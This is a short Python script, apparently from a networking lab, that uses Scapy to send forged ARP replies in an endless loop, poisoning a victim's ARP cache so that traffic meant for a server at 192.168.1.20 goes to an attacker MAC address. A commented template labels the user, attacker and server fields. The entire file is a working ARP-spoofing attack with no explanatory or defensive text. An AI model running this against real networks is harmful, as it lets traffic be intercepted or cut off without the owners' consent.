
from scapy.all import *
import time

while True:
    E = Ether(dst = '00:1D:9C:C7:B0:10', src = 'AA:AA:AA:AA:AA:AA')  
    A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.20', hwdst = '00:1D:9C:C7:B0:10', pdst = '192.168.1.10')  
    
    print(f"send a packet")
    pkt = E/A  
    sendp(pkt)

    """
    E = Ether(dst = '<User_MAC>', src = '<Attacker_MAC>')  
    A = ARP(op = 2, hwsrc = '<Attacker_MAC>', psrc = '<Server_IP>', hwdst = '<User_MAC>', pdst = '<User_IP>')  
    
    pkt = E/A  
    pkt.show()  
    sendp(pkt)
    """